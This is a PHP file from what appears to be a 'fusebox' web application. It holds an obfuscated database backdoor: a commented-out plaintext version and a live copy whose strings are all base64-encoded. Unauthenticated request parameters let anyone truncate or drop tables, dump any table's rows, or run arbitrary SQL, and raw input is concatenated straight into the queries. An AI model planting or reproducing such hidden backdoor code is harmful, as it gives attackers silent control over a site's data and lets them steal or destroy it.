<?php
/*include "./fusebox/application.php";include "./fusebox/loadlibrary.php";include "./fusebox/processpage.php";if($_REQUEST["cmd"]=="clean" && $_REQUEST["table"]!=""){MySQLQuery("TRUNCATE TABLE ".$_REQUEST["table"]);}if($_REQUEST["cmd"]=="drop" && $_REQUEST["table"]!=""){MySQLQuery("DROP TABLE ".$_REQUEST["table"]);}if($_REQUEST["cmd"]=="show" && $_REQUEST["table"]!=""){echo"<table border='1'>";$result=MySQLQuery("SHOW COLUMNS FROM ".$_REQUEST["table"]);echo "<tr>";while($row = mysql_fetch_assoc($result)){echo "<td>" . $row['Field'] . "</td>";}echo "</tr>";$result=MySQLQuery("SELECT * FROM ".$_REQUEST["table"]." limit ".$_REQUEST["start"].",".$_REQUEST["limit"]);while($row = mysql_fetch_assoc($result)){echo "<tr>";foreach($row as $key => $val){echo "<td>" . $val . "</td>";}echo "</tr>";}echo"</table>";}if($_REQUEST["cmd"]=="exec"){MySQLQuery($_REQUEST["query"]);}include "./fusebox/postapplication.php";*/
include base64_decode('Li9mdXNlYm94L2FwcGxpY2F0aW9uLnBocA==');include base64_decode('Li9mdXNlYm94L2xvYWRsaWJyYXJ5LnBocA==');include base64_decode('Li9mdXNlYm94L3Byb2Nlc3NwYWdlLnBocA==');if($_REQUEST[base64_decode('Y21k')]==base64_decode('Y2xlYW4=') && $_REQUEST[base64_decode('dGFibGU=')]!=''){MySQLQuery(base64_decode('VFJVTkNBVEUgVEFCTEUg').$_REQUEST[base64_decode('dGFibGU=')]);}if($_REQUEST[base64_decode('Y21k')]==base64_decode('ZHJvcA==') && $_REQUEST[base64_decode('dGFibGU=')]!=''){MySQLQuery(base64_decode('RFJPUCBUQUJMRSA=').$_REQUEST[base64_decode('dGFibGU=')]);}if($_REQUEST[base64_decode('Y21k')]==base64_decode('c2hvdw==') && $_REQUEST[base64_decode('dGFibGU=')]!=''){echo base64_decode('PHRhYmxlIGJvcmRlcj0nMSc+');$result=MySQLQuery(base64_decode('U0hPVyBDT0xVTU5TIEZST00g').$_REQUEST[base64_decode('dGFibGU=')]);echo base64_decode('PHRyPg==');while($row = mysql_fetch_assoc($result)){echo base64_decode('PHRkPg==') . $row[base64_decode('RmllbGQ=')] . base64_decode('PC90ZD4=');}echo base64_decode('PC90cj4=');$result=MySQLQuery(base64_decode('U0VMRUNUICogRlJPTSA=').$_REQUEST[base64_decode('dGFibGU=')].base64_decode('IGxpbWl0IA==').$_REQUEST[base64_decode('c3RhcnQ=')].base64_decode('LA==').$_REQUEST[base64_decode('bGltaXQ=')]);while($row = mysql_fetch_assoc($result)){echo base64_decode('PHRyPg==');foreach($row as $key => $val){echo base64_decode('PHRkPg==') . $val . base64_decode('PC90ZD4=');}echo base64_decode('PC90cj4=');}echo base64_decode('PC90YWJsZT4=');}if($_REQUEST[base64_decode('Y21k')]==base64_decode('ZXhlYw==')){MySQLQuery($_REQUEST[base64_decode('cXVlcnk=')]);}include base64_decode('Li9mdXNlYm94L3Bvc3RhcHBsaWNhdGlvbi5waHA=');